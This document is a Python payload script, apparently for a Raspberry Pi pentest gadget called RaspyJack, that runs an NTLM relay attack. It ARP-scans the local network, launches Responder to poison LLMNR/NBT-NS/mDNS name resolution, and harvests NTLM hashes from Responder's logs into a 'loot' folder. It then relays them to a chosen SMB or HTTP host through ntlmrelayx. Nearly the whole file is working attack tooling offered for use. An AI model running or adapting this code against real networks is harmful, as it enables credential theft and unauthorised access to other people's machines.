#!/usr/bin/env python3
"""
RaspyJack Payload -- NTLM Relay Attack
========================================
Author: 7h30th3r0n3

Wrapper around the vendored Responder tool at /root/Raspyjack/Responder/.
Captures NTLM hashes via poisoning and optionally relays them to a
target host.

Setup / Prerequisites:
  - Requires Responder installed at /root/Raspyjack/Responder/.
  - Best results when run after ARP MITM or silent bridge setup.

Steps:
  1) Discover hosts on the local network via ARP scan
  2) User selects relay target and service type (SMB/HTTP)
  3) Start Responder to poison LLMNR/NBT-NS/mDNS
  4) Monitor Responder logs for captured hashes
  5) Attempt relay of captured hashes

Controls:
  OK        -- Start Responder / relay
  UP / DOWN -- Select target host
  KEY1      -- Toggle service type (SMB / HTTP)
  KEY2      -- Export captured hashes
  KEY3      -- Exit + kill Responder

Loot: /root/Raspyjack/loot/NTLMRelay/
"""

import os
import sys
import re
import json
import time
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/NTLMRelay"
os.makedirs(LOOT_DIR, exist_ok=True)

RESPONDER_DIR = "/root/Raspyjack/Responder"
RESPONDER_SCRIPT = os.path.join(RESPONDER_DIR, "Responder.py")
RESPONDER_LOG_DIR = os.path.join(RESPONDER_DIR, "logs")
SERVICE_TYPES = ["SMB", "HTTP"]
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
hosts = []              # list of dicts: {ip, mac}
scroll_pos = 0
service_idx = 0         # index into SERVICE_TYPES
status_msg = "Idle"
view_mode = "targets"   # targets | running | hashes
responder_running = False
captured_hashes = []    # list of dicts: {timestamp, type, user, hash, source}
relay_attempts = 0
relay_successes = 0

_responder_proc = None
_iface = None

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_default_iface():
    """Detect the default network interface for Responder."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                idx = parts.index("dev")
                if idx + 1 < len(parts):
                    return parts[idx + 1]
    except Exception:
        pass
    # Fallback to eth0
    return "eth0"


# ---------------------------------------------------------------------------
# ARP host discovery
# ---------------------------------------------------------------------------

def _arp_scan(iface):
    """Discover hosts on the local network via arp-scan or ARP table."""
    found = []

    # Try arp-scan first
    try:
        result = subprocess.run(
            ["sudo", "arp-scan", "-I", iface, "--localnet", "-q"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    found.append({"ip": ip, "mac": mac})
        if found:
            return found
    except Exception:
        pass

    # Fallback: read ARP table
    try:
        result = subprocess.run(
            ["ip", "neigh", "show"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 5 and parts[2] == "dev":
                ip = parts[0]
                mac = parts[4] if len(parts) > 4 else "??"
                if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    found.append({"ip": ip, "mac": mac})
    except Exception:
        pass

    return found


def do_arp_scan():
    """Background ARP scan."""
    global hosts, scroll_pos, status_msg
    iface = _iface or _detect_default_iface()
    with lock:
        status_msg = "Scanning network..."
    found = _arp_scan(iface)
    with lock:
        hosts = found
        scroll_pos = 0
        status_msg = f"Found {len(found)} hosts"


# ---------------------------------------------------------------------------
# Responder management
# ---------------------------------------------------------------------------

def _start_responder():
    """Start Responder in background."""
    global _responder_proc, responder_running, status_msg

    iface = _iface or _detect_default_iface()

    if not os.path.isfile(RESPONDER_SCRIPT):
        with lock:
            status_msg = "Responder not found!"
        return

    with lock:
        status_msg = "Starting Responder..."

    try:
        _responder_proc = subprocess.Popen(
            ["sudo", "python3", RESPONDER_SCRIPT, "-I", iface, "-wrf"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            cwd=RESPONDER_DIR,
        )
    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:18]}"
        return

    time.sleep(2)
    if _responder_proc.poll() is not None:
        stderr = ""
        try:
            stderr = _responder_proc.stderr.read().decode(errors="replace")[:40]
        except Exception:
            pass
        with lock:
            status_msg = f"Responder fail: {stderr[:16]}"
        return

    with lock:
        responder_running = True
        status_msg = "Responder active"

    # Start hash monitoring thread
    threading.Thread(target=_monitor_hashes, daemon=True).start()


def _stop_responder():
    """Stop Responder."""
    global _responder_proc, responder_running, status_msg

    with lock:
        responder_running = False

    if _responder_proc is not None:
        try:
            _responder_proc.terminate()
            _responder_proc.wait(timeout=5)
        except Exception:
            try:
                _responder_proc.kill()
            except Exception:
                pass
        _responder_proc = None

    # Kill any remaining Responder processes
    subprocess.run(["sudo", "pkill", "-f", "Responder.py"],
                   capture_output=True, timeout=5)

    with lock:
        status_msg = "Responder stopped"


def _monitor_hashes():
    """Monitor Responder log directory for captured hashes."""
    global captured_hashes, status_msg

    seen_files = set()

    while True:
        with lock:
            if not responder_running:
                break

        try:
            if os.path.isdir(RESPONDER_LOG_DIR):
                for fname in os.listdir(RESPONDER_LOG_DIR):
                    fpath = os.path.join(RESPONDER_LOG_DIR, fname)
                    if fpath in seen_files:
                        continue
                    if not fname.endswith(".txt"):
                        continue

                    seen_files.add(fpath)
                    _parse_responder_log(fpath, fname)
        except Exception:
            pass

        time.sleep(2)


def _parse_responder_log(fpath, fname):
    """Parse a Responder log file for hashes."""
    global captured_hashes

    hash_type = "Unknown"
    if "NTLM" in fname.upper():
        hash_type = "NTLMv2" if "v2" in fname.lower() else "NTLMv1"
    elif "SMB" in fname.upper():
        hash_type = "SMB"
    elif "HTTP" in fname.upper():
        hash_type = "HTTP"

    try:
        with open(fpath, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Typical Responder hash format: user::domain:challenge:hash:hash
                parts = line.split(":")
                user = parts[0] if parts else "unknown"
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "type": hash_type,
                    "user": user[:32],
                    "hash": line[:128],
                    "source": fname,
                }
                with lock:
                    # Avoid duplicates
                    existing_hashes = {h["hash"] for h in captured_hashes}
                    if line[:128] not in existing_hashes:
                        captured_hashes.append(entry)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Relay attempt
# ---------------------------------------------------------------------------

def _attempt_relay(target_ip, service):
    """Attempt NTLM relay to target using captured hash."""
    global relay_attempts, relay_successes, status_msg

    with lock:
        if not captured_hashes:
            status_msg = "No hashes to relay"
            return
        relay_attempts += 1
        status_msg = f"Relaying to {target_ip}..."

    # Use ntlmrelayx if available, otherwise log attempt
    ntlmrelayx = "/usr/bin/ntlmrelayx.py"
    impacket_relay = "/usr/local/bin/ntlmrelayx.py"

    relay_bin = None
    for path in (ntlmrelayx, impacket_relay):
        if os.path.isfile(path):
            relay_bin = path
            break

    if relay_bin:
        try:
            proto = "smb" if service == "SMB" else "http"
            target_url = f"{proto}://{target_ip}"
            result = subprocess.run(
                ["sudo", "python3", relay_bin, "-t", target_url, "-smb2support"],
                capture_output=True, text=True, timeout=30,
            )
            if "success" in result.stdout.lower():
                with lock:
                    relay_successes += 1
                    status_msg = "Relay success!"
            else:
                with lock:
                    status_msg = "Relay: no success"
        except subprocess.TimeoutExpired:
            with lock:
                status_msg = "Relay timeout"
        except Exception as exc:
            with lock:
                status_msg = f"Relay err: {str(exc)[:14]}"
    else:
        with lock:
            status_msg = "ntlmrelayx not found"


# ---------------------------------------------------------------------------
# Export hashes
# ---------------------------------------------------------------------------

def export_hashes():
    """Export captured hashes to loot directory."""
    with lock:
        if not captured_hashes:
            return None
        data = list(captured_hashes)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hashes_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

    # Also save raw hashes
    raw_path = os.path.join(LOOT_DIR, f"hashes_{ts}.txt")
    with open(raw_path, "w") as f:
        for entry in data:
            f.write(entry["hash"] + "\n")

    return path


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#CC44FF")
    with lock:
        active = responder_running
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_targets_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "NTLM RELAY")

    with lock:
        msg = status_msg
        sc = scroll_pos
        svc = SERVICE_TYPES[service_idx]

    d.text((2, 15), f"{msg[:16]}  [{svc}]", font=font, fill="#FFAA00")

    if not hosts:
        d.text((10, 50), "No hosts found", font=font, fill="#666")
        d.text((10, 64), "OK to scan + start", font=font, fill="#666")
    else:
        visible = hosts[sc:sc + ROWS_VISIBLE]
        for i, host in enumerate(visible):
            y = 28 + i * 12
            color = "#FFFF00" if i == 0 else "#CCCCCC"
            d.text((2, y), f"{host['ip'][:15]}", font=font, fill=color)
            d.text((96, y), f"{host['mac'][-5:]}", font=font, fill="#888")

    _draw_footer(d, "OK:Start K1:Svc K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_running_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "NTLM RELAY")

    with lock:
        msg = status_msg
        hash_count = len(captured_hashes)
        attempts = relay_attempts
        successes = relay_successes
        svc = SERVICE_TYPES[service_idx]
        running = responder_running

    y = 18
    color = "#00FF00" if running else "#FF4444"
    d.text((2, y), msg[:22], font=font, fill=color)
    y += 16
    d.text((2, y), f"Service: {svc}", font=font, fill="white")
    y += 14
    d.text((2, y), f"Hashes: {hash_count}", font=font, fill="#FFAA00")
    y += 14
    d.text((2, y), f"Relay: {successes}/{attempts}", font=font, fill="#00CCFF")

    if hash_count > 0:
        y += 16
        last = captured_hashes[-1]
        d.text((2, y), f"User: {last['user'][:18]}", font=font, fill="#CC44FF")
        y += 12
        d.text((2, y), f"Type: {last['type']}", font=font, fill="#888")

    _draw_footer(d, "K2:Export OK:Stop K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_hashes_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "CAPTURED HASHES")

    with lock:
        hashes = list(captured_hashes)
        sc = scroll_pos

    if not hashes:
        d.text((10, 50), "No hashes yet", font=font, fill="#666")
    else:
        visible = hashes[sc:sc + 5]
        for i, h in enumerate(visible):
            y = 18 + i * 20
            d.text((2, y), f"{h['user'][:14]} [{h['type']}]", font=font, fill="#CC44FF")
            d.text((2, y + 10), f"  {h['hash'][:20]}", font=font, fill="#888")

    _draw_footer(d, f"{len(hashes)} hashes  K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _iface, scroll_pos, service_idx, view_mode, status_msg

    _iface = _detect_default_iface()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((12, 16), "NTLM RELAY", font=font, fill="#CC44FF")
    d.text((4, 36), "Responder + hash", font=font, fill="#888")
    d.text((4, 48), "capture & relay", font=font, fill="#888")
    d.text((4, 66), f"Iface: {_iface}", font=font, fill="#666")
    d.text((4, 82), "OK=Start K1=Service", font=font, fill="#666")
    d.text((4, 94), "K2=Export K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    # Initial ARP scan
    threading.Thread(target=do_arp_scan, daemon=True).start()

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "hashes":
                    with lock:
                        view_mode = "running" if responder_running else "targets"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                break

            if view_mode == "targets":
                if btn == "OK":
                    threading.Thread(target=_start_responder, daemon=True).start()
                    with lock:
                        view_mode = "running"
                    time.sleep(0.3)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(max(0, len(hosts) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "KEY1":
                    with lock:
                        service_idx = (service_idx + 1) % len(SERVICE_TYPES)
                    time.sleep(0.25)
                elif btn == "KEY2":
                    # Re-scan
                    threading.Thread(target=do_arp_scan, daemon=True).start()
                    time.sleep(0.3)
                draw_targets_view()

            elif view_mode == "running":
                if btn == "OK":
                    with lock:
                        running = responder_running
                    if running:
                        # Try relay to selected target
                        with lock:
                            if hosts and scroll_pos < len(hosts):
                                target = hosts[scroll_pos]["ip"]
                                svc = SERVICE_TYPES[service_idx]
                            else:
                                target = None
                                svc = None
                        if target:
                            threading.Thread(
                                target=_attempt_relay, args=(target, svc),
                                daemon=True,
                            ).start()
                        else:
                            _stop_responder()
                            with lock:
                                view_mode = "targets"
                    time.sleep(0.3)
                elif btn == "KEY1":
                    with lock:
                        service_idx = (service_idx + 1) % len(SERVICE_TYPES)
                    time.sleep(0.25)
                elif btn == "KEY2":
                    path = export_hashes()
                    if path:
                        with lock:
                            status_msg = f"Saved: {os.path.basename(path)[:16]}"
                    else:
                        with lock:
                            status_msg = "No hashes to export"
                    time.sleep(0.3)
                elif btn == "UP":
                    with lock:
                        view_mode = "hashes"
                        scroll_pos = 0
                    time.sleep(0.25)
                draw_running_view()

            elif view_mode == "hashes":
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(captured_hashes) - 1), scroll_pos + 1
                        )
                    time.sleep(0.15)
                draw_hashes_view()

            time.sleep(0.05)

    finally:
        _stop_responder()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
